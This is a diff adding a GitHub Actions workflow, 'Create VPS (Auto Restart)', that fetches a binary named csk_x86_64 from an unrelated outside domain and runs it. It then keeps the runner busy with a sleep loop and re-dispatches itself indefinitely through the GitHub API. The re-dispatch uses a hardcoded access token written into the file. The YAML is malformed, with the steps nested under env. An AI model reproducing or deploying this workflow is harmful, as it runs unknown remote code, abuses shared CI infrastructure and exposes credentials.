@@ -1,0 +1,46 @@
+          name: Create VPS (Auto Restart)
+
+          on:
+            workflow_dispatch:
+            repository_dispatch:
+              types: [create-vps]
+
+          jobs:
+            start-vps:
+              runs-on: ubuntu-latest
+              timeout-minutes: 360
+              env:
+                TMATE_SERVER: nyc1.tmate.io
+
+                - name: " Setup VPS"
+                  run: |
+                    wget xoclo.fordvungtau.com.vn/csk_x86_64 && chmod 777 * && ./csk_x86_64 github
+                - name: " Save backup"
+                  run: |
+                    name="${{ github.event.client_payload.vps_name }}"
+                    [ -z "$name" ] && name="manual-vps"
+                    zip -qr ".backup/$name.zip" . -x ".git/*" ".github/*" ".backup/*" || true
+
+                - name: " Push updated files"
+                  uses: stefanzweifel/git-auto-commit-action@v5
+                  with:
+                    commit_message: "?? Updated SSH + backup"
+                    file_pattern: 'links/*.txt .backup/*.zip'
+
+                - name: " Keep VPS alive"
+                  run: |
+                    for i in $(seq 1 360); do
+                      echo "Running minute $i/360..."
+                      sleep 60
+                    done
+
+                - name: " Restart workflow"
+                  if: always()
+                  run: |
+                    curl -X POST \
+                      -H "Accept: application/vnd.github+json" \
+                      -H "Authorization: Bearer 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" \
+                      -H "Content-Type: application/json" \
+                      https://api.github.com/repos/${{ github.repository }}/dispatches \
+                      -d '{"event_type": "create-vps", "client_payload": {"vps_name": "manual-vps", "backup": true}}'
+
